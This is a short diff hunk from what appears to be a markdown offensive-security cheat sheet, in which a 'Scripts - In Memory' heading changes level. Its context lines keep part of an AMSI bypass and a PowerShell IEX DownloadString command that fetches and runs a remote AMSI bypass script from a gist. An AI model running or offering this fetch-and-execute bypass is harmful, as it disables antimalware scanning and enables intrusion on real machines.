@@ -43,7 +43,7 @@ $field.SetValue($null,$true)
 IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.com/shantanu561993/6483e524dc225a188de04465c8512909/raw/db219421ea911b820e9a484754f03a26fbfb9c27/AMSI_bypass_Reflection.ps1')
 ~~~
 
-##### Scripts - In Memory
+### Scripts - In Memory
 -----------------------
 ~~~
 # Host Recon
